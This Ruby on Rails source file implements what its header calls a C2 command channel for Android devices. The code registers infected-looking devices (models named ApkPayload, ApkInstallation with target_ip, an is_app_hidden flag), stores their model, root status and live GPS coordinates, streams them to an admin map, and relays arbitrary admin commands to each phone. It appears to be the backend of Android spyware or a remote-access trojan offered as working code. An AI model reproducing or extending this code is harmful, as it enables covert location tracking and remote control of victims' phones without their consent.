# Command Channel for C2 communication with Android devices
class CommandChannel < ApplicationCable::Channel
  def subscribed
    @device_id = params[:device_id]
    stream_from "commands_#{@device_id}"
    
    # Mark device as online
    register_device_online
    
    Rails.logger.info "[CommandChannel] Device #{@device_id} connected"
  end

  def unsubscribed
    # Mark device as offline
    register_device_offline
    Rails.logger.info "[CommandChannel] Device #{@device_id} disconnected"
  end

  # Receive device info from Android
  def device_info(data)
    smartphone = Smartphone.find_by(android_id: @device_id)
    if smartphone
      smartphone.update(
        name: data['model'],
        operating_system: "Android #{data['os_version']}",
        is_rooted: data['is_rooted'] || false,
        last_seen_at: Time.current
      )
    end
    
    # Broadcast to admin
    ActionCable.server.broadcast(
      "admin_devices",
      { type: 'device_info', device_id: @device_id, data: data }
    )
  end

  # Receive location update from Android
  def location_update(data)
    smartphone = find_or_create_smartphone
    
    GeoLocation.create!(
      smartphone: smartphone,
      latitude: data.dig('data', 'latitude'),
      longitude: data.dig('data', 'longitude'),
      accuracy: data.dig('data', 'accuracy'),
      altitude: data.dig('data', 'altitude'),
      speed: data.dig('data', 'speed'),
      captured_at: Time.at(data.dig('data', 'timestamp').to_i / 1000)
    )
    
    # Broadcast to admin for live map
    ActionCable.server.broadcast(
      "location_#{@device_id}_admin",
      { type: 'location_update', device_id: @device_id, data: data['data'] }
    )
  end

  # Receive pong response from Android
  def pong(data)
    Rails.logger.info "[CommandChannel] Pong from #{@device_id}: #{data}"
    
    ActionCable.server.broadcast(
      "admin_devices",
      { type: 'pong', device_id: @device_id, timestamp: data['timestamp'] }
    )
  end

  # Admin sends command to device
  def send_command(data)
    command = data['command']
    params = data['params'] || {}
    
    ActionCable.server.broadcast(
      "commands_#{@device_id}",
      { type: 'command', action: command, params: params }
    )
    
    Rails.logger.info "[CommandChannel] Command '#{command}' sent to #{@device_id}"
  end

  private

  def register_device_online
    redis = Redis.new(url: ENV['REDIS_URL'] || 'redis://localhost:6379/1')
    redis.sadd('online_devices', @device_id)
    redis.set("device:#{@device_id}:last_seen", Time.current.to_i)
    redis.close
  rescue => e
    Rails.logger.warn "[CommandChannel] Redis error: #{e.message}"
  end

  def register_device_offline
    redis = Redis.new(url: ENV['REDIS_URL'] || 'redis://localhost:6379/1')
    redis.srem('online_devices', @device_id)
    redis.close
  rescue => e
    Rails.logger.warn "[CommandChannel] Redis error: #{e.message}"
  end

  def find_or_create_smartphone
    apk = ApkPayload.first
    installation = ApkInstallation.find_or_create_by!(apk_payload: apk, target_ip: @device_id) do |i|
      i.status = 'connected'
    end
    
    Smartphone.find_or_create_by!(apk_installation: installation) do |s|
      s.name = "Device #{@device_id[0..7]}"
      s.operating_system = 'Android'
      s.is_rooted = false
      s.is_app_hidden = false
    end
  end
end
